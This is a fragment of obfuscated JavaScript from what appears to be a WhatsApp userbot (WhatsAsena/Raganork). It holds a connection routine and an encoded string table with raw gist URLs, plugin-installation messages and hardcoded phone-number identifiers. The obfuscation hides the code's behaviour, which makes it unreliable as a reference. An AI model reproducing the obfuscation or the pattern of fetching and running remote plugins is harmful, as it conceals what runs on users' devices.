_0x22669a[_0x114a89(0x205)](_0x22669a[_0x114a89(0x1d6)][_0x114a89(0x21e)],_0x114a89(0x1cd)+'\x0a\x0a*📃\x20'+_0x338358+_0x114a89(0x170)+_0x12cce0+_0x114a89(0x1c9),MessageType[_0x114a89(0x171)]);}}}});});try{await _0x22669a[_0x14111b(0x1e5)]();}catch{if(!_0x5c476e){console[_0x14111b(0x1c2)](chalk[_0x14111b(0x1de)][_0x14111b(0x1f0)](_0x14111b(0x17a))),_0x22669a[_0x14111b(0x187)](_0x13b0c['deCrypt'](config[_0x14111b(0x195)]));try{await _0x22669a['connect']();}catch{return;}}}}function _0x1e3e(){var _0x16d74e=['updatePresence','all','map','onlyGroup','replace','.js','gif','{gphead}','toLowerCase','log','Gerçekleşen\x20Hata:\x20','https://gist.githubusercontent.com/souravkl11/ff107d59b17f1e4b96889a82dbb6d520/raw','level','logger','✅\x20Login\x20information\x20updated!','```🛡️\x20Blacklist\x20Tespit\x20Edildi!```\x20\x0a```Kullanıcı:```\x20\x0a```Sebep:```\x20','```','3xvsUHF','path','writeFileSync','*~_________~\x20ERROR\x20REPORT\x20~______~*','{gpdesc}','--\x20HATA\x20RAPORU\x20[WHATSASENA]\x20--','version','connecting','{gif}','LANG','videoMessage','sequelize','user','770248JbArJB','messages','findAll','248121uUHePh','./plugins/','public','chalk','red','messageStubType','then','create','PluginDB','{owner}','```🛡️\x20Blacklist\x20Detected!```\x20\x0a\x20```Kullanıcı:```\x20\x0a```Sebep:```\x20','connect','\x0a_Yardım\x20için\x20Telegram\x20grubumuza\x20yazabilirsiniz._','from','image','pin','⬇️\x20Installing\x20external\x20plugins...','blue','WEL_GIF','./config','got','DEBUG','bold','split','sync','arraybuffer','photo','get','Raga','messageStubParameters','includes','update','blueBright','nork','desc','./plugins/sql/','green','warn','video','Wrong\x20WORK_TYPE\x20key!\x20Please\x20use\x20“private”\x20or\x20“public”','259760cDpsPx','getMinutes','getTime','sendMessage','status@broadcast','SUPPORT','*Raganork\x20established\x20connection\x20✅*','SUDO','\x0a*WhatsAsena\x20bir\x20hata\x20gerçekleşti!*','groupMetadata','StringSession','🛡️\x20Blacklist\x20Detected\x20🛡️','now','caption','{gicon}','splice','SUPPORT3','existsSync','905511384572-1625319286','name','TEXT','forEach','*Bot\x20Started*','{gpmaker}','{mention}','base64EncodedAuthInfo','SUPPORT4','subject','jid','/formation/','deCrypt','485855TZGcTL','*\x0a\x0a```REPORT\x20ERRORS\x20IN\x20SUPPORT\x20GROUP\x0a','text','participant','length','fromMe','private','1393914VjFWqW','ℹ️\x20Connecting\x20to\x20WhatsApp...','key','data','Eski\x20sürüm\x20stringiniz\x20yenileniyor...','99tRhLRx','count','chatRead','commands','chats','patch','https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw','body','statusCode','./plugins/sql/plugin','@s.whatsapp.net','917012074386-1631435717','loadAuthInfo','indexOf','test','305674rMqCGg','remotejid','undefined','open','getHours','WORKTYPE','remoteJid','dataValues','imageMessage','SEND_READ','onlyPinned','SESSION','./events','1495872WgFBtQ','916282344739,0','```🛡️\x20Blacklist\x20Detected!```\x20\x0a```User:```\x20\x20\x0a```Reason:```\x20','⬇️Installing\x20plugins...','axios','readdirSync','italic','prototype','message','DATABASE','createStringSession','getProfilePicture','VERSION','function','owner','```[\x20ANNOUNCEMENT\x20]```\x0a\x0a','{pp}','@adiwajshing/baileys','pattern','/formation','SUPPORT2','.update\x20check','format','BLOCKCHAT','unavailable','\x0a_Bu\x20mesaj\x20sizin\x20numaranıza\x20(kaydedilen\x20mesajlar)\x20gitmiş\x20olmalıdır._\x0a\x0a','./plugins','Version:','remove','905511384572-1621015274','client','\x0a_Bu\x20hata\x20logunda\x20numaranız\x20veya\x20karşı\x20bir\x20tarafın\x20numarası\x20olabilir.\x20Lütfen\x20buna\x20dikkat\x20edin!_','url','919074309534-1632403322'];_0x1e3e=function(){return _0x16d74e;};return _0x1e3e();}whatsAsena();
